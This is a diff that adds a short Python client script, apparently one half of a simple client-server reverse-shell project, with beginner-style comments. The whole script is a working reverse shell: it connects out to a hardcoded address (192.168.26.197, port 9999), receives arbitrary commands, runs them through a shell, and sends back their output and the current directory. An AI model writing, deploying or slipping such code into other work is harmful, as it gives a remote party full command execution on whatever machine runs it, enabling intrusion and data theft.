@@ -1,0 +1,29 @@
+import socket
+import os                #The OS module in python provides functions for interacting with the operating system 
+import subprocess        #It also helps to obtain the input/output/error pipes as well as the exit codes of various commands
+
+s = socket.socket()
+host = '192.168.26.197'  #server.py ip     
+port = 9999
+
+s.connect((host, port))   #binding the socket 
+
+#data between server and client is not transferred in string it is transferred in bytes 
+#so we have to encode and decode it with utf-8 format
+
+while True:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8") == 'cd':      
+        os.chdir(data[3:].decode("utf-8"))
+
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte,"utf-8")
+        currentWD = os.getcwd() + "> "
+        s.send(str.encode(output_str + currentWD))
+
+        print(output_str)
+    
+s.close()         
+ 
